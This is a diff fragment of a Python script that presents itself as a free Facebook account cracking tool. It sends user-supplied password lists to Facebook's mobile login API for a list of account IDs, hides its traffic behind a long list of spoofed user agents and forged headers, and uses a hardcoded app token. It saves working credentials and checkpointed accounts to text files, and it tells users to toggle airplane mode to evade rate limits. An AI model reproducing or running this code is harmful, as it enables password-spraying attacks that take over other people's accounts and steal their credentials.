+				print("\n%s [=>] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,123456789"%(Y,G))
+				listpass = input("%s [=>] TYPE (123456,123456789) :%s "%(Y,G))
+				print("───────────────────────────────────────────────────────× ")
+				if len(listpass)<=5:
+					exit("\n%s [=>] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [=>] CRACK WITH PASSWORD -> [\033[0;97m%s\033[0;97m]"%(Y,listpass))
+				os.system("clear")
+				logo2()
+				print("───────────────────────────────────────────────────────× ")
+				print("\033[0;92m[=×>]\033[0;92m NOTE : BEFORE LOGIN CP IDZ ")
+				print("\033[0;92m[=×>]\033[0;92m NOTE : CLEAR YOUR FACEBOOK /BROWSER DATA " )
+				print("\033[0;92m[=×>]\033[0;92m NOTE : ENJOY FREE TOOL")
+				print("\033[0;92m[=×>]\033[0;92m NOTE : HAR 10 MIN BAD AIRPLAN MOD/FLIGHT MOD ON KRO ")
+				print("\033[0;97m───────────────────────────────────────────────────────× ")
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n    [=>] CRACK COMPLETE...")
+		except Exception as e:exit(str(e))
+
+	def api(self, uid, pwx):
+
+		ua = random.choice([
+			'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
+			'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
+			'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
+			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
+			'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
+			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
+			'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
+			'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
+			'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
+			'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
+'Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36',
+ 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
+ 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
+ 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
+ 'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
+ 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
+ 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
+ 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0 Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537',
+ 'Mozilla/5.0 (Linux; Android 10; Infinix X687 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36[FBAN/FB4A;FBAV/222.0.0.48.113;]',
+ 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+ 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
+ 'NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)',
+ 'Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G977N/KSU4CTG1) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/12.1 Chrome/79.0.3945.136 Mobile Safari/537.36'
+   'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER',
+  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0',
+  'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
+  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0',
+  'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
+  'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0',
+  'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0',
+  'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)',
+  'Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763',
+  'Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
+  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+  'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)',
+  'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
+  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
+  'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
+  'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)',
+  'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+  'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063',
+  'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0',
+  'Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)',
+  'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
+  'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
+  'Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)',
+  'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
+  'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
+  'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
+  'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)',
+  'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
+  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36',
+  'Mozilla/5.0 (Linux; ; ) AppleWebKit/ (KHTML, like Gecko) Chrome/ Mobile Safari/',
+  'Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36',
+  'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0',
+  'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254',
+  'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebKit/537.36(KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536',
+  'Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
+  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322)',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
+  'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
+  'Mozilla/5.0 (Windows IoT 10.0; Android 6.0.1; WebView/3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Mobile Safari/537.36 Edge/17.17134',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36',
+  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
+			])
+		for pw in pwx:
+			pw = pw.lower()
+			ses = requests.Session()
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
+			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
+			if "session_key" in response.text and "EAAA" in response.text:
+				print("\r  \033[0;97m   [=WASI=OK=>] %s | %s\033[0;97m         "%(uid, pw))
+				self.ok.append("%s|%s"%(uid, pw))
+				open("ok.txt","a").write("   [=WASI=OK=>]  %s|%s\n"%(uid, pw))
+				break
+			elif "www.facebook.com" in response.json()["error_msg"]:
+				print("\r  \033[0;92m   [=WASI=CP=>] %s | %s\033[0;97m         "%(uid, pw))
+				self.cp.append("%s|%s"%(uid, pw))
+				open("cp.txt","a").write("   [=WASI=CP=>]  %s|%s\n"%(uid, pw))
+				break
+			else:
+				continue
